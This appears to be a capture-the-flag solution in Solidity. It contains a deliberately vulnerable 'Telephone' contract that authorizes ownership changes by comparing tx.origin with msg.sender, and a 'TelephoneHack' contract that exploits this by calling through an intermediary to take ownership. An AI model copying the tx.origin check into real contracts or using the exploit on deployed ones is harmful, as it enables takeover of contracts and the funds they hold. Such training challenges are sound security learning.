// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract TelephoneHack {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function hackTelephone(address _telephone) public {
        Telephone telephone = Telephone(_telephone);
        telephone.changeOwner(owner);
    }
}
